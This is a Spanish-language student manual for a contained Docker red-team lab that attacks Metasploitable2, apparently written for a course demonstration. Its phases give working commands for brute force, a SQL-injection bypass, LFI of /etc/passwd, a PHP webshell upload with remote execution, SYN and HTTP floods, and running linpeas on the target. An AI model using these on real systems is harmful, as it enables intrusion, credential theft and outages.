# Manual de Demostración — Red Team Lab
## Redes 2 · Ciclo 2026 · Entrega 23 mayo

---

## Índice

1. [Requisitos previos](#1-requisitos-previos)
2. [Levantar el entorno](#2-levantar-el-entorno)
3. [Verificar conectividad (smoke tests)](#3-verificar-conectividad)
4. [Fase 1 — Reconocimiento](#4-fase-1--reconocimiento)
5. [Fase 2 — Escaneo de puertos](#5-fase-2--escaneo-de-puertos)
6. [Fase 3 — Enumeración HTTP](#6-fase-3--enumeración-http)
7. [Fase 4 — Credenciales](#7-fase-4--credenciales)
8. [Fase 5 — Explotación web](#8-fase-5--explotación-web)
9. [Fase 6 — DoS (coordinado con Blue Team)](#9-fase-6--dos)
10. [Fase 7 — Post-explotación](#10-fase-7--post-explotación)
11. [Ver evidencias](#11-ver-evidencias)
12. [Detener el entorno](#12-detener-el-entorno)
13. [Referencia rápida de comandos](#13-referencia-rápida)

---

## 1. Requisitos previos

### Software necesario en el equipo del presentador

| Software | Versión mínima | Descarga |
|----------|---------------|----------|
| Docker Desktop | 4.x | docker.com/products/docker-desktop |
| Git | 2.x | git-scm.com |
| Terminal | PowerShell 7+ o CMD | incluido en Windows |

### Clonar el repositorio

Ejecutar **una sola vez** en la máquina donde se hará la demo:

```powershell
git clone https://github.com/govandoh/Red-team-env-project.git C:\Project-Red-Team
cd C:\Project-Red-Team
```

Si el repositorio ya está clonado, actualizar a la versión más reciente:

```powershell
cd C:\Project-Red-Team
git pull origin master
```

---

## 2. Levantar el entorno

Todos los comandos de esta sección se ejecutan en **PowerShell** desde `C:\Project-Red-Team`.

### 2.1 Iniciar Docker Desktop

Abrir Docker Desktop y esperar a que el ícono de la bandeja del sistema muestre "Docker Desktop is running".

### 2.2 Construir e iniciar los contenedores

```powershell
cd C:\Project-Red-Team\docker
docker compose up -d --build
```

El primer arranque descarga imágenes (~2-3 GB). Las siguientes veces tarda ~30 segundos.

**Salida esperada:**

```
[+] Building ...
[+] Running 3/3
 ✔ Network lab-net              Created
 ✔ Container redteam-target     Started
 ✔ Container redteam-kali       Started
```

### 2.3 Verificar que ambos contenedores están corriendo

```powershell
docker ps
```

**Salida esperada:**

```
CONTAINER ID   IMAGE                      STATUS         NAMES
xxxxxxxxxxxx   kalilinux/kali-rolling     Up X seconds   redteam-kali
xxxxxxxxxxxx   tleemcjr/metasploitable2   Up X seconds   redteam-target
```

Si `redteam-target` aparece en `Restarting`, esperar 30 segundos y volver a verificar — Metasploitable2 tarda en iniciar todos sus servicios.

### 2.4 Verificar conectividad básica

```powershell
docker exec redteam-kali ping -c 3 172.20.0.20
```

**Salida esperada:** 3 paquetes enviados, 0% packet loss.

---

## 3. Verificar conectividad

El proyecto incluye un script de smoke tests que valida el entorno antes de empezar.

```powershell
docker exec redteam-kali bash /root/scripts/lib/test-common.sh
```

**Salida esperada (6 tests pasando):**

```
[PASS] Target 172.20.0.20 is reachable (ping)
[PASS] SSH port 22 is open on target
[PASS] HTTP port 80 is open on target
[PASS] FTP port 21 is open on target
[PASS] validate_target rejects out-of-scope IP
[PASS] validate_target accepts 172.20.0.20
--- 6/6 passed ---
```

Si algún test falla, esperar 30 segundos y repetir — Metasploitable2 puede tardar hasta 2 minutos en tener todos los servicios activos.

---

## 4. Fase 1 — Reconocimiento

**Objetivo:** Descubrir hosts activos en la red, obtener banners de servicios y resolver DNS inverso.

**Técnicas:** Ping sweep (nmap -sn), banner grabbing (netcat), DNS reverso (dig).

### Ejecutar

```powershell
docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-1-recon/recon.sh"
```

### Qué hace el script paso a paso

1. **Ping sweep** — Escanea toda la subred `172.20.0.0/24` para descubrir hosts activos:
   ```bash
   nmap -sn 172.20.0.0/24
   ```

2. **Banner grabbing** — Se conecta a puertos comunes (21, 22, 23, 25, 80, 139, 443, 445, 3306) y captura el banner de cada servicio:
   ```bash
   nc -v -w 2 172.20.0.20 <puerto>
   ```

3. **DNS reverso** — Resuelve el nombre de host del target:
   ```bash
   dig -x 172.20.0.20 +short
   ```

### Resultado esperado

```
================================================================
 Phase 1 — Reconnaissance
 Target  : 172.20.0.20
 Date    : YYYY-MM-DD HH:MM:SS
================================================================
[INFO] Ping sweep over 172.20.0.0/24
[INFO] Banner grabbing on common ports of 172.20.0.20
[INFO] Reverse DNS lookup for 172.20.0.20
[INFO] Evidence saved at: /root/loot/phase-1-recon/<timestamp>/
```

### Evidencia generada

| Archivo | Contenido |
|---------|-----------|
| `ping-sweep.txt` | Hosts activos en 172.20.0.0/24 |
| `banners.txt` | Banners de cada puerto |
| `dns-reverse.txt` | Nombre DNS del target |

---

## 5. Fase 2 — Escaneo de puertos

**Objetivo:** Descubrir todos los puertos abiertos, identificar versiones de servicios y detectar el sistema operativo.

**Técnicas:** Escaneo SYN completo (nmap -sS -p-), fingerprinting de versiones (-sV), detección de OS (-O), scripts NSE de vulnerabilidades.

**Duración estimada:** 5-10 minutos (escaneo completo de 65535 puertos).

### Ejecutar

```powershell
docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-2-scanning/port-scan.sh"
```

### Qué hace el script paso a paso

1. **Escaneo SYN completo** con detección de versión y OS:
   ```bash
   nmap -sS -sV -O -p- --min-rate 1000 172.20.0.20
   ```
   Genera tres archivos de salida: `.nmap` (texto), `.xml` (XML), `.gnmap` (grep-able).

2. **Resumen de puertos abiertos** — Extrae y lista solo los puertos en estado `open`:
   ```bash
   grep "/open/" full-scan.gnmap | tr ',' '\n' | grep "/open/"
   ```

3. **Scripts NSE de vulnerabilidades** — Lanza los scripts del módulo `vuln` de nmap:
   ```bash
   nmap --script vuln 172.20.0.20
   ```

### Resultado esperado

Metasploitable2 expone ~30 puertos. Los más relevantes:

```
21/tcp   open  ftp       vsftpd 2.3.4
22/tcp   open  ssh       OpenSSH 4.7p1
23/tcp   open  telnet    Linux telnetd
25/tcp   open  smtp      Postfix
80/tcp   open  http      Apache/2.2.8
139/tcp  open  netbios   Samba smbd
445/tcp  open  microsoft Samba smbd
3306/tcp open  mysql     MySQL 5.0.51a
5432/tcp open  postgresql PostgreSQL 8.3
```

### Evidencia generada

| Archivo | Contenido |
|---------|-----------|
| `full-scan.nmap` | Salida completa del escaneo |
| `full-scan.xml` | Salida XML (importable en Metasploit) |
| `open-ports.txt` | Lista limpia de puertos abiertos |
| `vuln-scripts.txt` | Vulnerabilidades detectadas por NSE |

---

## 6. Fase 3 — Enumeración HTTP

**Objetivo:** Descubrir directorios y aplicaciones web, detectar vulnerabilidades HTTP conocidas, identificar el stack tecnológico.

**Técnicas:** Nikto (scanner de vulnerabilidades web), Gobuster (fuerza bruta de directorios), Whatweb (fingerprinting).

### Ejecutar

```powershell
docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-3-enumeration/enum-http.sh"
```

### Qué hace el script paso a paso

1. **Nikto** — Escaneo automatizado de vulnerabilidades HTTP:
   ```bash
   nikto -h http://172.20.0.20:80 -o nikto.txt
   ```
   Detecta: versiones desactualizadas, headers de seguridad faltantes, directorios expuestos, phpinfo expuesto.

2. **Gobuster** — Descubrimiento de directorios por fuerza bruta:
   ```bash
   gobuster dir -u http://172.20.0.20 -w /usr/share/dirb/wordlists/common.txt
   ```

3. **Whatweb** — Fingerprinting del stack tecnológico:
   ```bash
   whatweb -v http://172.20.0.20
   ```

### Resultado esperado

Directorios descubiertos en Metasploitable2:

```
/dvwa          — Damn Vulnerable Web App
/mutillidae    — Mutillidae (OWASP Top 10 demo)
/phpMyAdmin    — Administración MySQL
/phpinfo.php   — Información del servidor PHP
/twiki         — Wiki vulnerable
/dav           — WebDAV habilitado
```

### Evidencia generada

| Archivo | Contenido |
|---------|-----------|
| `nikto.txt` | Vulnerabilidades y hallazgos HTTP |
| `gobuster.txt` | Directorios descubiertos con status codes |
| `whatweb.txt` | Stack tecnológico identificado |

---

## 7. Fase 4 — Credenciales

**Objetivo:** Obtener acceso autenticado a servicios usando credenciales por defecto conocidas de Metasploitable2.

### 7.1 Credenciales por defecto (ejecutar primero)

```powershell
docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-4-credentials/default-creds.sh"
```

**Qué hace:**

El script prueba 7 pares de credenciales conocidas de Metasploitable2 contra SSH y FTP:

```
msfadmin:msfadmin
root:root
admin:admin
user:user
postgres:postgres
service:service
vagrant:vagrant
```

Para SSH usa los flags necesarios para conectarse a OpenSSH 4.7p1 (protocolo legacy):

```bash
sshpass -p "msfadmin" ssh \
    -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o "MACs=+hmac-md5,hmac-sha1" \
    -o HostKeyAlgorithms=+ssh-rsa \
    172.20.0.20 "id"
```

**Resultado esperado:**

```
[INFO] Trying SSH  msfadmin:msfadmin
ssh,msfadmin,msfadmin,SUCCESS
[INFO] Trying FTP  msfadmin:msfadmin
ftp,msfadmin,msfadmin,SUCCESS
...
[INFO] Summary of successful logins:
ssh,msfadmin,msfadmin,SUCCESS
ftp,msfadmin,msfadmin,SUCCESS
ssh,user,user,SUCCESS
```

### 7.2 Brute force con Hydra (opcional si default-creds no encuentra nada)

```powershell
docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-4-credentials/brute-force.sh"
```

**Qué hace:**

```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
      -P passwords-100.txt \
      -t 4 -V -f \
      ssh://172.20.0.20
```

Limita a 100 contraseñas para no tardar horas. Si default-creds.sh ya encontró `msfadmin:msfadmin`, este paso es opcional.

### Evidencia generada

| Archivo | Contenido |
|---------|-----------|
| `default-creds-results.txt` | CSV con resultado de cada par |
| `hydra-results.txt` | Credenciales encontradas por Hydra |

---

## 8. Fase 5 — Explotación web

**Objetivo:** Confirmar y explotar vulnerabilidades en las aplicaciones web de Metasploitable2.

### 8.1 SQL Injection — Prueba automatizada con sqlmap

```powershell
docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-5-exploitation/web-sqli.sh"
```

**Qué hace:**

```bash
sqlmap -u "http://172.20.0.20/mutillidae/index.php?page=login.php" \
       --batch --level=2 --risk=1 --forms --dbs
```

### 8.2 SQL Injection — Confirmación manual (demo visual recomendada)

Abrir en el navegador del host (no dentro del contenedor):

```
http://172.20.0.20/mutillidae/index.php?page=login.php
```

En el campo **Username** ingresar el siguiente payload:
```
admin' OR '1'='1
```

En **Password** ingresar cualquier texto, por ejemplo:
```
cualquiercosa
```

Hacer clic en **Login**. La aplicación mostrará el login exitoso y el query SQL ejecutado:

```sql
SELECT * FROM accounts WHERE username='admin' OR '1'='1' AND password='cualquiercosa'
```

Esto confirma inyección SQL: la condición `'1'='1'` siempre es verdadera, bypaseando la autenticación.

Para mostrar desde línea de comandos (dentro del Kali):

```powershell
docker exec redteam-kali bash -c "
  curl -s -X POST \
    'http://172.20.0.20/mutillidae/index.php?page=login.php' \
    -d 'username=admin%27+OR+%271%27%3D%271&password=x&login-php-submit-button=Login' \
    | grep -i 'logged in\|query\|accounts'
"
```

### 8.3 LFI — Local File Inclusion

```powershell
docker exec redteam-kali bash -c "
  curl -s 'http://172.20.0.20/mutillidae/index.php?page=../../../../etc/passwd' \
    | grep -E '^[a-z_][a-z0-9_-]*:x:'
"
```

**Resultado esperado:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
```

Otros archivos que se pueden extraer por LFI:

```powershell
# /etc/hosts
docker exec redteam-kali bash -c "curl -s 'http://172.20.0.20/mutillidae/index.php?page=../../../../etc/hosts'"

# /proc/version (kernel del servidor)
docker exec redteam-kali bash -c "curl -s 'http://172.20.0.20/mutillidae/index.php?page=../../../../proc/version'"
```

### 8.4 File Upload + RCE — Webshell en DVWA

**Paso 1:** Verificar que DVWA está en modo "low security":

Abrir en el navegador:
```
http://172.20.0.20/dvwa/security.php
```
Iniciar sesión con `admin` / `password`, seleccionar "low" y guardar.

**Paso 2 (desde línea de comandos):** Login, upload y verificación de ejecución remota:

```powershell
docker exec redteam-kali bash -c "
  # Crear webshell
  echo '<?php echo shell_exec(\$_GET[\"cmd\"]); ?>' > /tmp/shell-test.php

  # Login a DVWA
  curl -s -c /tmp/dvwa.txt \
    -d 'username=admin&password=password&Login=Login' \
    -L 'http://172.20.0.20/dvwa/login.php' > /dev/null

  # Upload de la shell
  curl -s -b /tmp/dvwa.txt \
    -F 'uploaded=@/tmp/shell-test.php;type=image/jpeg' \
    -F 'Upload=Upload' \
    'http://172.20.0.20/dvwa/vulnerabilities/upload/' \
    | grep -i 'succesfully\|error'
"
```

**Resultado esperado:**

```
../../hackable/uploads/shell-test.php succesfully uploaded!
```

**Paso 3:** Verificar ejecución remota de código:

```powershell
docker exec redteam-kali bash -c "
  echo '=== id ==='; curl -s 'http://172.20.0.20/dvwa/hackable/uploads/shell-test.php?cmd=id'
  echo '=== uname -a ==='; curl -s 'http://172.20.0.20/dvwa/hackable/uploads/shell-test.php?cmd=uname+-a'
  echo '=== whoami ==='; curl -s 'http://172.20.0.20/dvwa/hackable/uploads/shell-test.php?cmd=whoami'
"
```

**Resultado esperado:**

```
=== id ===
uid=33(www-data) gid=33(www-data) groups=33(www-data)
=== uname -a ===
Linux vulnerable-server ...
=== whoami ===
www-data
```

### 8.5 Script completo (LFI + upload automatizados)

```powershell
docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-5-exploitation/web-shells.sh"
```

### Evidencia generada

| Archivo | Contenido |
|---------|-----------|
| `lfi-passwd.txt` | Contenido de /etc/passwd del target |
| `lfi-url.txt` | URL exacta que explotó LFI |
| `upload-rce.txt` | Confirmación de RCE con salidas de id y uname |
| `shell-test.php` | Webshell subida al servidor |

---

## 9. Fase 6 — DoS

**REQUISITO OBLIGATORIO: Coordinación previa con Blue Team.**

Antes de ejecutar cualquier vector, enviar al canal del equipo:

```
[RED TEAM — INICIO FASE 6]
Fase     : DoS
Hora     : HH:MM
Técnica  : Slowloris + HTTP flood + SYN flood secuenciales
Target   : 172.20.0.20 (puerto 80)
Duración : ~25 minutos incluyendo pausas
Señal OK : Confirmar cuando estén monitoreando con Wireshark
```

Esperar confirmación escrita del Blue Team antes de continuar.

---

### Ejecutar — 3 terminales simultáneas

#### Terminal 1 (PowerShell en el HOST) — Captura de paquetes

```powershell
cd C:\Project-Red-Team
bash observability/start-pcap.sh
```

Esto resuelve automáticamente el nombre del bridge de Docker (`br-XXXXXXXXXXXX`) e inicia `tcpdump`. El archivo `.pcap` se guarda en `evidence/pcap/capture-<timestamp>.pcap`.

Para que el Blue Team abra el pcap en tiempo real con Wireshark:
```powershell
# Obtener el nombre del archivo pcap generado
cat /tmp/lab-pcap-file
# Abrir en Wireshark (reemplazar con la ruta real)
wireshark evidence\pcap\capture-<timestamp>.pcap
```

#### Terminal 2 (PowerShell) — Monitor de latencia en tiempo real

```powershell
docker exec -it redteam-kali bash -c "
  LAB_TARGET=172.20.0.20 bash /root/scripts/phase-6-dos/99-monitor.sh
"
```

Muestra una línea por segundo con `timestamp | http_code | tiempo_respuesta`. Durante el ataque se verá cómo el tiempo de respuesta aumenta o el código cambia a `000` (timeout).

#### Terminal 3 (PowerShell) — Orquestador de vectores

```powershell
docker exec -it redteam-kali bash -c "
  LAB_TARGET=172.20.0.20 PAUSE_BETWEEN_VECTORS=30 bash /root/scripts/phase-6-dos/run-dos-window.sh
"
```

> **Nota:** `PAUSE_BETWEEN_VECTORS=30` reduce la pausa entre vectores a 30 segundos para la demo. En producción real es 300 segundos (5 minutos) para permitir recuperación completa del servicio.

El script pide confirmación interactiva antes de cada paso:

```
============================================
 DoS WINDOW — Coordinated attack execution
============================================
Pre-flight checklist:
  [ ] Blue Team notificado y monitoreando
  [ ] Ventana acordada (hora inicio / hora fin)
  [ ] Canal de señal de abort establecido
  [ ] 99-monitor.sh corriendo en segunda terminal

Todo confirmado? Escribe YES para continuar:
```

Escribir `YES` y presionar Enter.

Luego para cada vector:

```
Baseline capturado. Iniciar Vector 1 (Slowloris)? [y/N]
```

Escribir `y` y presionar Enter.

---

### Detalles de cada vector

#### Vector 1 — Slowloris

**Qué hace:** Abre 500 conexiones HTTP incompletas y las mantiene vivas enviando headers parciales cada 10 segundos. Agota el pool de workers del servidor Apache (150 conexiones máximo por defecto), impidiendo que usuarios legítimos se conecten.

```bash
slowhttptest -c 500 -H -i 10 -r 200 -t GET \
             -u http://172.20.0.20:80/ -x 24 -p 3 -l 60 \
             -g -o slowloris-report
```

**Duración:** 60 segundos. **Impacto esperado:** Apache deja de responder a nuevas conexiones. El monitor mostrará `000` (timeout) en los logs.

#### Vector 2 — HTTP Flood

**Qué hace:** Envía 50,000 requests HTTP GET con 1000 conexiones concurrentes usando Apache Bench. Satura el ancho de banda y la CPU del servidor.

```bash
ab -n 50000 -c 1000 -t 60 -r http://172.20.0.20:80/
```

**Duración:** Hasta 60 segundos. **Impacto esperado:** Aumento masivo de requests por segundo, degradación del tiempo de respuesta.

#### Vector 3 — SYN Flood

**Qué hace:** Envía miles de paquetes SYN con IPs de origen aleatorias (`--rand-source`). El servidor crea entradas en la tabla de conexiones semidefinidas (half-open) que nunca se completan, agotando los recursos del kernel.

```bash
hping3 -S --flood --rand-source -p 80 172.20.0.20
```

**Duración:** 30 segundos. **Este es el vector más disruptivo** — el servicio puede tardar más en recuperarse.

---

### Señal de abort

Si el Blue Team envía la palabra **"ABORT"** al canal, presionar `Ctrl+C` inmediatamente en el Terminal 3 para detener el vector activo.

### Verificar recuperación del servicio

```powershell
docker exec redteam-kali bash -c "
  curl -s -o /dev/null -w '%{http_code} - %{time_total}s\n' http://172.20.0.20/
"
```

Resultado esperado cuando el servicio se recuperó:
```
200 - 0.012s
```

### Detener la captura de paquetes

```powershell
bash observability/stop-pcap.sh
```

### Evidencia generada

| Archivo | Contenido |
|---------|-----------|
| `baseline-curl.csv` | Latencia baseline (30 muestras antes del ataque) |
| `baseline-ab.txt` | Métricas Apache Bench antes del ataque |
| `slowloris-report.html` | Reporte gráfico del Slowloris |
| `slowloris.pcap` | Captura de paquetes del vector 1 |
| `http-flood-ab.txt` | Métricas del HTTP flood |
| `http-flood.pcap` | Captura de paquetes del vector 2 |
| `syn-flood.log` | Log del SYN flood |
| `syn-flood.pcap` | Captura de paquetes del vector 3 |
| `monitor-HHMMSS.csv` | Latencia durante el ataque (una línea por segundo) |
| `evidence/pcap/capture-*.pcap` | Captura global desde el host |

---

## 10. Fase 7 — Post-explotación

**Objetivo:** Con las credenciales `msfadmin:msfadmin` obtenidas en Fase 4, ejecutar linpeas para buscar rutas de escalada de privilegios.

**Prerequisito:** Conectividad SSH confirmada (verificada en Fase 4).

### Ejecutar

```powershell
docker exec redteam-kali bash -c "
  LAB_TARGET=172.20.0.20 SSH_USER=msfadmin SSH_PASS=msfadmin \
  bash /root/scripts/phase-7-post-exploitation/privesc-check.sh
"
```

**Qué hace el script paso a paso:**

1. Verifica conectividad SSH como `msfadmin@172.20.0.20`
2. Descarga `linpeas.sh` desde GitHub (requiere internet en el Kali)
3. Copia `linpeas.sh` al target via SCP
4. Ejecuta linpeas remotamente y guarda el output
5. Muestra hallazgos críticos (confianza ≥95%)

**Conexión SSH manual para la demo:**

```powershell
docker exec -it redteam-kali bash -c "
  sshpass -p msfadmin ssh \
    -o StrictHostKeyChecking=no \
    -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o 'MACs=+hmac-md5,hmac-sha1' \
    -o HostKeyAlgorithms=+ssh-rsa \
    msfadmin@172.20.0.20
"
```

Una vez dentro del target, ejecutar comandos de exploración:

```bash
id                          # uid=1000(msfadmin)
sudo -l                     # qué puede ejecutar como root
find / -perm -4000 2>/dev/null | head -20   # binarios SUID
cat /etc/crontab            # tareas programadas
uname -a                    # versión del kernel
```

### Evidencia generada

| Archivo | Contenido |
|---------|-----------|
| `linpeas-output.txt` | Output completo de linpeas |
| `run.log` | Hallazgos críticos filtrados |

---

## 11. Ver evidencias

Toda la evidencia se guarda dentro del contenedor Kali en `/root/loot/`.

### Ver estructura completa

```powershell
docker exec redteam-kali find /root/loot -type f | sort
```

### Ver evidencia de una fase específica

```powershell
# Fase 1
docker exec redteam-kali ls -lh /root/loot/phase-1-recon/

# Fase 4 — credenciales
docker exec redteam-kali cat /root/loot/phase-4-credentials/<timestamp>/default-creds-results.txt

# Fase 5 — LFI
docker exec redteam-kali cat /root/loot/phase-5-exploitation/<timestamp>/lfi-passwd.txt

# Fase 5 — RCE
docker exec redteam-kali cat /root/loot/phase-5-exploitation/<timestamp>/upload-rce.txt
```

Reemplazar `<timestamp>` con el directorio listado (formato `YYYYMMDD-HHMMSS`).

### Copiar evidencia al host (para el informe)

```powershell
# Copiar todo el loot al host
docker cp redteam-kali:/root/loot C:\Project-Red-Team\evidence-export

# Copiar solo una fase
docker cp redteam-kali:/root/loot/phase-5-exploitation C:\Project-Red-Team\evidence-export\
```

---

## 12. Detener el entorno

```powershell
cd C:\Project-Red-Team\docker
docker compose down
```

Para detener y eliminar también los volúmenes (reset completo):

```powershell
docker compose down -v
```

---

## 13. Referencia rápida

### Comandos de una sola línea para la demo

```powershell
# Levantar entorno
cd C:\Project-Red-Team\docker && docker compose up -d --build

# Smoke tests
docker exec redteam-kali bash /root/scripts/lib/test-common.sh

# Fase 1 — Recon
docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-1-recon/recon.sh"

# Fase 2 — Scan
docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-2-scanning/port-scan.sh"

# Fase 3 — Enum HTTP
docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-3-enumeration/enum-http.sh"

# Fase 4 — Default creds
docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-4-credentials/default-creds.sh"

# Fase 5 — SQLi manual (demo rápida)
docker exec redteam-kali bash -c "curl -s -X POST 'http://172.20.0.20/mutillidae/index.php?page=login.php' -d 'username=admin%27+OR+%271%27%3D%271&password=x&login-php-submit-button=Login' | grep -i 'query\|logged'"

# Fase 5 — LFI (demo rápida)
docker exec redteam-kali bash -c "curl -s 'http://172.20.0.20/mutillidae/index.php?page=../../../../etc/passwd' | grep -E '^[a-z_][a-z0-9_-]*:x:'"

# Fase 5 — Web shells completo
docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-5-exploitation/web-shells.sh"

# Fase 6 — Monitor (Terminal 2)
docker exec -it redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-6-dos/99-monitor.sh"

# Fase 6 — DoS (Terminal 3, con pausa reducida para demo)
docker exec -it redteam-kali bash -c "LAB_TARGET=172.20.0.20 PAUSE_BETWEEN_VECTORS=30 bash /root/scripts/phase-6-dos/run-dos-window.sh"

# Fase 7 — Post-explotación
docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 SSH_USER=msfadmin SSH_PASS=msfadmin bash /root/scripts/phase-7-post-exploitation/privesc-check.sh"

# Detener entorno
cd C:\Project-Red-Team\docker && docker compose down
```

### IPs y credenciales del laboratorio

| Componente | IP | Usuario | Contraseña |
|------------|-----|---------|-----------|
| Kali (atacante) | 172.20.0.10 | root | — |
| Metasploitable2 (target) | 172.20.0.20 | msfadmin | msfadmin |
| DVWA | 172.20.0.20 | admin | password |
| phpMyAdmin | 172.20.0.20 | root | (vacía) |

### Solución de problemas frecuentes

| Problema | Causa | Solución |
|----------|-------|----------|
| `redteam-target` en Restarting | Metasploitable2 tarda en iniciar | Esperar 60s, volver a ejecutar `docker ps` |
| `ping: connect: Network unreachable` | Stack no levantado | `docker compose up -d` desde `docker/` |
| `ssh: Connection refused` | Servicio SSH no activo aún | Esperar 60s más y reintentar |
| `curl: (7) Failed to connect` | Target no alcanzable | Verificar que ambos contenedores están en `lab-net` |
| `Permission denied` en start-pcap.sh | tcpdump requiere root | Ejecutar PowerShell como Administrador |
| Smoke test falla | Servicios aún iniciando | Esperar 2 min y repetir |
